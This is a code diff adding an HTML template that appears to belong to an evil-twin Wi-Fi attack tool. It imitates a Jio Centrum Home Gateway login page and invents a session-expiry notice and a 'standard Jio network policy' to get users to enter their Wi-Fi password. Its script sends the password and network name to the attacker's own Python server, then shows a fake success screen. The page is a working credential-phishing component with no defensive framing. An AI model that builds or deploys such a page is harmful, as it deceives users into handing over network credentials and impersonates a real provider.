@@ -1,0 +1,333 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8"/>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Jio Centrum Home Gateway</title>
+  <style>
+    * { box-sizing: border-box; margin: 0; padding: 0; }
+
+    body {
+      font-family: Arial, sans-serif;
+      background: #f0f4f8;
+      min-height: 100vh;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+    }
+
+    /* ── Top bar ── */
+    .topbar {
+      position: fixed;
+      top: 0; left: 0; right: 0;
+      background: #003087;
+      height: 52px;
+      display: flex;
+      align-items: center;
+      padding: 0 24px;
+      z-index: 100;
+    }
+
+    .topbar-logo {
+      color: #fff;
+      font-size: 22px;
+      font-weight: 700;
+      letter-spacing: 1px;
+    }
+
+    .topbar-logo span {
+      color: #00d4ff;
+    }
+
+    .topbar-subtitle {
+      color: #a0c4f1;
+      font-size: 12px;
+      margin-left: 12px;
+      margin-top: 4px;
+    }
+
+    /* ── Card ── */
+    .card {
+      background: #fff;
+      border-radius: 8px;
+      box-shadow: 0 2px 16px rgba(0,0,0,0.13);
+      width: 100%;
+      max-width: 420px;
+      margin-top: 52px;
+      overflow: hidden;
+    }
+
+    .card-header {
+      background: #003087;
+      padding: 20px 28px 16px;
+    }
+
+    .card-header h1 {
+      color: #fff;
+      font-size: 17px;
+      font-weight: 600;
+    }
+
+    .card-header p {
+      color: #a0c4f1;
+      font-size: 12px;
+      margin-top: 4px;
+    }
+
+    .card-body {
+      padding: 28px;
+    }
+
+    /* ── Notice banner ── */
+    .notice {
+      background: #fff8e1;
+      border-left: 4px solid #f9a825;
+      border-radius: 4px;
+      padding: 10px 14px;
+      margin-bottom: 22px;
+      font-size: 13px;
+      color: #5a4500;
+      line-height: 1.5;
+    }
+
+    /* ── Form ── */
+    label {
+      display: block;
+      font-size: 13px;
+      color: #444;
+      margin-bottom: 5px;
+      font-weight: 600;
+    }
+
+    input[type="text"],
+    input[type="password"] {
+      width: 100%;
+      padding: 10px 12px;
+      border: 1px solid #ccd6e0;
+      border-radius: 4px;
+      font-size: 14px;
+      color: #222;
+      margin-bottom: 18px;
+      outline: none;
+      transition: border 0.2s;
+    }
+
+    input[type="text"]:focus,
+    input[type="password"]:focus {
+      border-color: #003087;
+    }
+
+    .show-pw {
+      display: flex;
+      align-items: center;
+      gap: 7px;
+      font-size: 12px;
+      color: #666;
+      margin-top: -12px;
+      margin-bottom: 20px;
+      cursor: pointer;
+      user-select: none;
+    }
+
+    button[type="submit"] {
+      width: 100%;
+      padding: 11px;
+      background: #003087;
+      color: #fff;
+      border: none;
+      border-radius: 4px;
+      font-size: 15px;
+      font-weight: 600;
+      cursor: pointer;
+      transition: background 0.2s;
+      letter-spacing: 0.5px;
+    }
+
+    button[type="submit"]:hover {
+      background: #00225e;
+    }
+
+    /* ── Error message (hidden by default) ── */
+    .error-msg {
+      display: none;
+      background: #fdecea;
+      border: 1px solid #f5c6cb;
+      color: #a00;
+      border-radius: 4px;
+      padding: 9px 13px;
+      font-size: 13px;
+      margin-bottom: 14px;
+    }
+
+    /* ── Footer ── */
+    .card-footer {
+      background: #f5f8fb;
+      border-top: 1px solid #e0e8f0;
+      padding: 12px 28px;
+      font-size: 11px;
+      color: #888;
+      display: flex;
+      justify-content: space-between;
+    }
+
+    .card-footer a {
+      color: #003087;
+      text-decoration: none;
+    }
+
+    /* ── Success screen (hidden by default) ── */
+    .success-screen {
+      display: none;
+      flex-direction: column;
+      align-items: center;
+      padding: 36px 28px;
+      text-align: center;
+    }
+
+    .success-icon {
+      width: 56px;
+      height: 56px;
+      background: #e8f5e9;
+      border-radius: 50%;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      margin-bottom: 16px;
+    }
+
+    .success-icon svg {
+      width: 30px;
+      height: 30px;
+      stroke: #2e7d32;
+    }
+
+    .success-screen h2 {
+      font-size: 17px;
+      color: #1a3c5e;
+      margin-bottom: 8px;
+    }
+
+    .success-screen p {
+      font-size: 13px;
+      color: #666;
+      line-height: 1.6;
+    }
+  </style>
+</head>
+<body>
+
+  <!-- Top navigation bar -->
+  <div class="topbar">
+    <div>
+      <div class="topbar-logo">jio<span>.</span></div>
+    </div>
+    <div class="topbar-subtitle">Centrum Home Gateway</div>
+  </div>
+
+  <!-- Login card -->
+  <div class="card">
+
+    <div class="card-header">
+      <h1>Wi-Fi Authentication Required</h1>
+      <p>Your session has expired. Please re-enter your Wi-Fi password to continue.</p>
+    </div>
+
+    <div class="card-body">
+
+      <!-- Notice banner -->
+      <div class="notice">
+        ⚠️ For your security, periodic re-authentication is required on this network.
+        This is a standard Jio network policy.
+      </div>
+
+      <!-- Error message shown on wrong password attempt -->
+      <div class="error-msg" id="error-msg">
+        Incorrect password. Please try again.
+      </div>
+
+      <!-- Login form -->
+      <form id="login-form" method="POST" action="/submit">
+
+        <label for="ssid">Network Name (SSID)</label>
+        <input
+          type="text"
+          id="ssid"
+          name="ssid"
+          value="{{ ssid }}"
+          readonly
+        />
+
+        <label for="password">Wi-Fi Password</label>
+        <input
+          type="password"
+          id="password"
+          name="password"
+          placeholder="Enter your Wi-Fi password"
+          autocomplete="off"
+          required
+        />
+
+        <label class="show-pw">
+          <input type="checkbox" onchange="
+            var p = document.getElementById('password');
+            p.type = this.checked ? 'text' : 'password';
+          "/>
+          Show password
+        </label>
+
+        <button type="submit">Authenticate</button>
+
+      </form>
+
+      <!-- Success screen (shown after submission via JS) -->
+      <div class="success-screen" id="success-screen">
+        <div class="success-icon">
+          <svg viewBox="0 0 24 24" fill="none" stroke-width="2.5"
+               stroke-linecap="round" stroke-linejoin="round">
+            <polyline points="20 6 9 17 4 12"/>
+          </svg>
+        </div>
+        <h2>Authentication Successful</h2>
+        <p>You are now connected to the Jio network.<br/>
+           You may close this window.</p>
+      </div>
+
+    </div>
+
+    <div class="card-footer">
+      <span>Jio Centrum Home Gateway &copy; 2024</span>
+      <a href="#">192.168.29.1</a>
+    </div>
+
+  </div>
+
+  <script>
+    document.getElementById('login-form').addEventListener('submit', function(e) {
+      e.preventDefault();
+
+      var pw = document.getElementById('password').value;
+
+      // Send the password to our Python server
+      fetch('/submit', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
+        body: 'password=' + encodeURIComponent(pw) +
+              '&ssid=' + encodeURIComponent(document.getElementById('ssid').value)
+      }).then(function(response) {
+        return response.json();
+      }).then(function(data) {
+        if (data.status === 'ok') {
+          // Show success screen
+          document.getElementById('login-form').style.display = 'none';
+          document.getElementById('success-screen').style.display = 'flex';
+        } else {
+          document.getElementById('error-msg').style.display = 'block';
+          document.getElementById('password').value = '';
+        }
+      });
+    });
+  </script>
+
+</body>
+</html>
